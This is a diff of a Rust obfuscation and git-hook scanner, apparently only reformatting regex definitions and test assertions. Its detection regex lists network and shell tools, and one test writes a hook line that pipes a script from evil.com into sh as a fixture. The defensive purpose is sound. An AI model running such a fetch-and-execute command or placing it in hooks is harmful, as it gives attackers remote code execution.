@@ -7,8 +7,7 @@ use super::{is_language, DANGEROUS_FUNCS};
 
 // --- Lazy-compiled regex patterns ---
 
-static RE_HEX_ESCAPE: Lazy<Regex> =
-    Lazy::new(|| Regex::new(r"(\\x[0-9a-fA-F]{2}){3,}").unwrap());
+static RE_HEX_ESCAPE: Lazy<Regex> = Lazy::new(|| Regex::new(r"(\\x[0-9a-fA-F]{2}){3,}").unwrap());
 
 static RE_UNICODE_ESCAPE: Lazy<Regex> =
     Lazy::new(|| Regex::new(r"(\\u[0-9a-fA-F]{4}){3,}|(\\u\{[0-9a-fA-F]+\}){3,}").unwrap());
@@ -23,16 +22,14 @@ static RE_CHARCODE_JS: Lazy<Regex> =
 static RE_CHARCODE_PHP: Lazy<Regex> =
     Lazy::new(|| Regex::new(r"chr\(\d+\)\s*\.\s*chr\(\d+\)").unwrap());
 
-static RE_BRACKET_NOTATION: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"\w+\[\s*['"][a-zA-Z]+['"]\s*\+\s*['"][a-zA-Z]+['"]\s*\]"#).unwrap()
-});
+static RE_BRACKET_NOTATION: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r#"\w+\[\s*['"][a-zA-Z]+['"]\s*\+\s*['"][a-zA-Z]+['"]\s*\]"#).unwrap());
 
 static RE_CONSTRUCTOR_CHAIN: Lazy<Regex> =
     Lazy::new(|| Regex::new(r"\.constructor\s*(\.\s*constructor\s*)+\(").unwrap());
 
-static RE_PHP_VAR_FUNC: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"\$\w+\s*=\s*['"](\w+)['"]"#).unwrap()
-});
+static RE_PHP_VAR_FUNC: Lazy<Regex> =
+    Lazy::new(|| Regex::new(r#"\$\w+\s*=\s*['"](\w+)['"]"#).unwrap());
 
 static RE_GIT_HOOK_SUSPICIOUS: Lazy<Regex> = Lazy::new(|| {
     Regex::new(r"(?i)(curl\s|wget\s|eval\s|base64|/bin/sh|/bin/bash|\|\s*sh|\|\s*bash|python\s+-c|node\s+-e|nc\s+-|ncat\s|mkfifo)").unwrap()
@@ -225,8 +222,7 @@ pub fn scan_git_hooks(target: &Path) -> Vec<AuditFinding> {
 
 /// Reconstruct concatenated string fragments: 'ev' + 'al' -> eval
 fn reconstruct_concat(line: &str) -> String {
-    static RE_FRAGMENTS: Lazy<Regex> =
-        Lazy::new(|| Regex::new(r#"['"]([a-zA-Z_]+)['"]"#).unwrap());
+    static RE_FRAGMENTS: Lazy<Regex> = Lazy::new(|| Regex::new(r#"['"]([a-zA-Z_]+)['"]"#).unwrap());
 
     let mut result = String::new();
     for cap in RE_FRAGMENTS.captures_iter(line) {
@@ -277,7 +273,9 @@ mod tests {
         for (i, line) in content.lines().enumerate() {
             scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
         }
-        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-hex-escape"));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "obfuscation-hex-escape"));
     }
 
     #[test]
@@ -292,7 +290,9 @@ mod tests {
         for (i, line) in content.lines().enumerate() {
             scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
         }
-        assert!(!findings.iter().any(|f| f.rule_id == "obfuscation-hex-escape"));
+        assert!(!findings
+            .iter()
+            .any(|f| f.rule_id == "obfuscation-hex-escape"));
     }
 
     #[test]
@@ -307,7 +307,9 @@ mod tests {
         for (i, line) in content.lines().enumerate() {
             scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
         }
-        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-unicode-escape"));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "obfuscation-unicode-escape"));
     }
 
     #[test]
@@ -322,8 +324,10 @@ mod tests {
         for (i, line) in content.lines().enumerate() {
             scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
         }
-        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-string-concat"
-            || f.rule_id == "obfuscation-bracket-notation"));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "obfuscation-string-concat"
+                || f.rule_id == "obfuscation-bracket-notation"));
     }
 
     #[test]
@@ -353,7 +357,9 @@ mod tests {
         for (i, line) in content.lines().enumerate() {
             scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
         }
-        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-constructor-chain"));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "obfuscation-constructor-chain"));
     }
 
     #[test]
@@ -368,7 +374,9 @@ mod tests {
         for (i, line) in content.lines().enumerate() {
             scan_line(line, i + 1, &path.to_string_lossy(), &path, &mut findings);
         }
-        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-php-variable-function"));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "obfuscation-php-variable-function"));
     }
 
     #[test]
@@ -383,7 +391,9 @@ mod tests {
         writeln!(f, "curl http://evil.com/payload.sh | sh").unwrap();
 
         let findings = scan_git_hooks(dir.path());
-        assert!(findings.iter().any(|f| f.rule_id == "obfuscation-git-hook-injection"));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "obfuscation-git-hook-injection"));
     }
 
     #[test]
